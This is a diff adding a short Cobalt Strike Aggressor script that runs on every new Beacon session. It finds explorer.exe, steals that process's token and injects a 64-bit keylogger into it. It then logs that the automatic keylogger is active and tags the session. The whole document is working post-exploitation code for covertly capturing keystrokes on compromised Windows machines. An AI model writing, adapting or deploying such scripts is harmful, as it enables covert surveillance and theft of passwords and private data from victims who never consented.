@@ -1,0 +1,24 @@
+sub getexplorerpid {
+  bps($1, lambda({
+    local('$pid $name $entry');
+    foreach $entry (split("\n", $2)) {
+      ($name, $ppid, $pid, $arch) = split("\\s+", $entry);
+      println($entry);
+      # println("Name: $name PID: $pid ");
+      if ($name eq "explorer.exe") {
+        # $1 is our Beacon ID, $pid is the PID of explorer.exe
+        [$callback: $1, $pid];
+      }
+    }
+  }, $callback => $2));
+}
+
+
+on beacon_initial {
+  getexplorerpid($1, {
+    bsteal_token($1, int($2));
+    bkeylogger($1, $2, "x64");
+    });
+  blog($1, "Automatic keylogger activated");
+  bnote($1, "Auto-keylogger")
+}
